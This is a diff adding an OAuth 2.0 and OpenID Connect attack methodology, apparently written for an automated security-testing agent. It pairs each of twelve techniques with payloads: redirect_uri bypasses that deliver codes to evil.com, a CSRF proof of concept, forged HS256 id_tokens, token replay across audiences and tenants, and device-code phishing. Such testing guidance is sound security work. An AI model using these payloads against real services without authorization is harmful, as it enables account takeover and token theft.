@@ -1,0 +1,215 @@
+SCOPE: OAuth 2.0 and OpenID Connect flows — identify authorization, authentication, and token handling vulnerabilities across authorization servers, resource servers, and client applications.
+
+## TARGETS
+
+- Authorization endpoint: `GET /oauth/authorize`, `/auth/authorize`, `/connect/authorize`, `/oauth2/auth`
+- Token endpoint: `POST /oauth/token`, `/auth/token`, `/connect/token`, `/oauth2/token`
+- Introspection: `POST /oauth/introspect`, `/token/introspect`
+- Revocation: `POST /oauth/revoke`
+- JWKS endpoint: `GET /.well-known/jwks.json`, `/oauth/jwks`
+- OIDC discovery: `GET /.well-known/openid-configuration`
+- Device auth: `POST /oauth/device/code`
+- Callback/redirect endpoint: `/auth/callback`, `/oauth/callback`, `/signin-oidc`
+- Token exchange: `POST /oauth/token` with `grant_type=urn:ietf:params:oauth:grant-type:token-exchange`
+
+## TECHNIQUES
+
+1. **Missing or predictable state parameter → CSRF on callback**
+   The `state` parameter is the CSRF token for OAuth flows. If absent, an attacker initiates a flow on behalf of the victim by tricking them into visiting the authorization URL — the victim's browser completes the code exchange and the attacker's account is linked.
+
+   ```
+   # Check if state is present:
+   GET /oauth/authorize?response_type=code&client_id=<id>&redirect_uri=https://app.example.com/callback
+   # Missing state= param → CSRF possible
+
+   # Check if state is predictable (e.g., sequential integers, UUIDs with low entropy):
+   state=1234, state=1235, state=1236...
+
+   # CSRF PoC:
+   <img src="https://authserver.com/oauth/authorize?client_id=...&state=FIXED&redirect_uri=https://app.example.com/callback">
+   # Victim visits page → their session is bound to attacker's authorization code
+   ```
+
+2. **redirect_uri open redirect and parser bypass**
+   The authorization server validates `redirect_uri` against a registered list, but parser differences allow bypasses. Test all variants:
+
+   ```
+   # Path traversal:
+   redirect_uri=https://app.example.com/callback/../../../evil.com/
+
+   # Open subdomain:
+   redirect_uri=https://evil.app.example.com/callback
+
+   # Registered prefix bypass (if server checks prefix only):
+   redirect_uri=https://app.example.com/callback.evil.com
+
+   # Fragment confusion:
+   redirect_uri=https://app.example.com/callback#@evil.com/
+
+   # Double encoding:
+   redirect_uri=https://app.example.com%2Fcallback%2F..%2F..%2F@evil.com/
+
+   # Port variation (if only scheme+host validated):
+   redirect_uri=https://app.example.com:8443/callback
+
+   # Wildcard abuse (if server allows wildcards):
+   redirect_uri=https://*.example.com/callback → https://evil.example.com/callback
+   ```
+
+   If any variant is accepted, the authorization code (or implicit token) is delivered to the attacker's redirect target.
+
+3. **PKCE missing on public clients**
+   Public clients (mobile apps, SPAs) MUST use PKCE (`code_challenge` + `code_verifier`) to prevent authorization code interception. If the server accepts the authorization flow without `code_challenge`, an intercepted code can be exchanged without the verifier.
+
+   ```
+   # Authorization request without PKCE:
+   GET /oauth/authorize?response_type=code&client_id=mobile-app&redirect_uri=app://callback
+   # No code_challenge or code_challenge_method params
+
+   # If server returns code, exchange without code_verifier:
+   POST /oauth/token
+   grant_type=authorization_code&code=<intercepted-code>&redirect_uri=app://callback&client_id=mobile-app
+   # No code_verifier param
+
+   200 OK → {"access_token":"..."}   ← PKCE not enforced
+   ```
+
+4. **Implicit flow token in URL fragment leakage**
+   The implicit flow (`response_type=token`) puts the `access_token` directly in the URL fragment. This leaks to: browser history, Referer headers on subsequent navigation, server-side access logs if the fragment is incorrectly forwarded, and JavaScript on the page via `window.location.hash`.
+
+   ```
+   GET /oauth/authorize?response_type=token&client_id=...&redirect_uri=https://app.example.com/callback
+
+   → redirect to: https://app.example.com/callback#access_token=<token>&token_type=bearer&expires_in=3600
+   ```
+
+   Test whether the page's JavaScript sends the fragment to analytics, logging, or third-party scripts. Also test `response_type=token id_token` for OIDC hybrid mode token leakage.
+
+5. **id_token HS256 algorithm confusion**
+   OIDC id_tokens signed with HS256 use a shared secret. If the client library falls back to treating the client_secret as the HMAC key, and the client_secret is guessable or leaked, forge a valid id_token for any subject.
+
+   ```
+   # Decoded id_token header: {"alg":"RS256","kid":"key1"}
+   # Modified:                {"alg":"HS256"}
+
+   # Sign modified payload with client_secret as HMAC key:
+   import jwt
+   forged = jwt.encode(
+     {"sub":"admin@example.com","iss":"https://auth.example.com","aud":"<client_id>","exp":9999999999},
+     client_secret, algorithm="HS256"
+   )
+   ```
+
+   This is the JWT alg confusion attack applied specifically to OIDC id_token validation at the RP (relying party).
+
+6. **iss (issuer) substitution in multi-tenant OIDC**
+   Multi-tenant identity providers (e.g., Azure AD with `common` endpoint) validate `iss` claims tenant-specifically, but misconfigured relying parties may accept tokens from any tenant. Test by obtaining a token from a different tenant and presenting it to the application.
+
+   ```
+   # Token from attacker-controlled tenant:
+   {"iss":"https://login.microsoftonline.com/<attacker-tenant-id>/v2.0","sub":"attacker-oid","email":"victim@example.com"}
+
+   # Application accepts if it validates iss only as "https://login.microsoftonline.com/*/v2.0"
+   POST /signin-oidc
+   id_token=<attacker-tenant-token>
+   ```
+
+   Also test with tokens from `https://accounts.google.com` vs. a private OIDC provider that happens to have the same `sub` value.
+
+7. **aud (audience) confusion across clients**
+   If multiple applications share the same identity provider, a token issued for one client (`aud: "app-a"`) may be accepted by another client if `aud` validation is absent or accepts arrays.
+
+   ```
+   # Get token for low-privilege public app:
+   POST /oauth/token
+   grant_type=authorization_code&client_id=public-mobile-app&code=...
+
+   200 OK → {"access_token":"eyJ...aud:mobile-app..."}
+
+   # Present to admin API:
+   GET /admin/api/users
+   Authorization: Bearer <mobile-app-token>
+
+   200 OK → {"users":[...]}   ← aud validation missing on admin API
+   ```
+
+8. **Refresh token reuse by public client (cross-client token theft)**
+   If a confidential client issues a refresh token that can be exchanged by a public client without client authentication, an attacker who obtains the refresh token (e.g., from a JS bundle or browser storage) can get new access tokens indefinitely.
+
+   ```
+   POST /oauth/token
+   grant_type=refresh_token&refresh_token=<stolen-refresh-token>&client_id=public-client
+   # No client_secret required for public client
+
+   200 OK → {"access_token":"...","refresh_token":"..."}   ← token theft confirmed
+   ```
+
+   Also test whether refresh tokens are single-use: exchange the same refresh token twice. If both exchanges succeed, the server is not rotating or invalidating used tokens.
+
+9. **Scope creep on consent and scope enumeration**
+   Test whether requesting scopes beyond what the application registered is silently downgraded, rejected, or — critically — granted. Also enumerate valid scope names from OIDC discovery (`scopes_supported`) and try combining them in unexpected ways.
+
+   ```
+   # OIDC discovery reveals: "scopes_supported":["openid","profile","email","phone","address","offline_access","admin","read:all"]
+
+   GET /oauth/authorize?scope=openid+admin+read:all+offline_access&response_type=code&client_id=mobile-app...
+
+   # If consent screen shows admin scope and user accepts → scope was granted to unregistered client
+   ```
+
+   Also test scope injection in token exchange: `grant_type=urn:ietf:params:oauth:grant-type:token-exchange` with elevated `requested_token_type` or `scope`.
+
+10. **Device authorization code phishing**
+    The device authorization grant gives the user a code to enter at a verification URL. If the app presents the code to a victim (via phishing or social engineering), the victim's browser authorizes the attacker's device.
+
+    ```
+    POST /oauth/device/code
+    client_id=<app-client-id>&scope=openid+profile+email
+
+    200 OK → {"device_code":"...","user_code":"ABCD-EFGH","verification_uri":"https://example.com/device","expires_in":300}
+
+    # Attacker sends "ABCD-EFGH" to victim, victim enters at verification_uri
+    # Attacker polls:
+    POST /oauth/token
+    grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=...&client_id=...
+
+    200 OK → {"access_token":"..."}   ← victim's account access obtained
+    ```
+
+11. **JWKS rotation race condition**
+    When an authorization server rotates its signing keys, there is a window between publishing the new JWKS and revoking the old key. If the server removes old key entries from JWKS immediately, tokens signed with the old key will fail validation before they expire — a denial of service. More critically, if the server accepts JWTs where the `kid` header is not present in the JWKS (missing key graceful fallback), probe whether it falls back to any embedded key or accepts an attacker-supplied key.
+
+    ```
+    # Token with kid not in JWKS:
+    {"alg":"RS256","kid":"non-existent-key-id"}
+
+    # Some servers: 401 (correct)
+    # Some servers: try fallback to embedded jwk header (exploitable with jku trick)
+    # Some servers: accept if only one key in JWKS (key confusion)
+    ```
+
+12. **token_hint IDOR on revocation and introspection endpoints**
+    The revocation endpoint (`/oauth/revoke`) accepts a `token_hint` parameter. Test whether you can revoke another user's tokens by passing their token values (obtained via IDOR in another finding), or whether the endpoint reveals token validity for arbitrary tokens via timing difference.
+
+    ```
+    POST /oauth/introspect
+    Authorization: Basic <client-credentials>
+    token=<victim-access-token>&token_hint=access_token
+
+    200 OK → {"active":true,"sub":"victim@example.com","scope":"read:all write:all","exp":...}
+    ```
+
+    Also test unauthenticated introspection (no client credentials) and whether `sub` is returned to unauthorized callers.
+
+## WHAT TO RECORD
+
+When calling `mantis_record_finding`, populate:
+
+- `title`: e.g. "OAuth missing state param → CSRF login", "redirect_uri path traversal bypass allows code theft", "PKCE not enforced on mobile client"
+- `severity`: `critical` (account takeover, token theft enabling full account access), `high` (CSRF login, scope escalation), `medium` (implicit flow leakage, predictable state), `low` (scope enumeration, JWKS key info)
+- `url`: authorization endpoint or token endpoint where issue was observed
+- `method`: `GET` (authorization request) or `POST` (token request)
+- `request_params`: the query string or POST body showing the bypassed parameter
+- `response_body_excerpt` or redirect URL: show where the token/code was delivered
+- `evidence_notes`: describe the OAuth flow being exploited (authorization_code, implicit, device), which parameter was bypassed, and what the attacker can do (e.g., "code delivered to attacker.com, exchangeable for victim's access token")
+- `cwe`: CWE-352 (CSRF); CWE-601 (Open Redirect); CWE-287 (Improper Authentication); CWE-346 (Origin Validation Error)
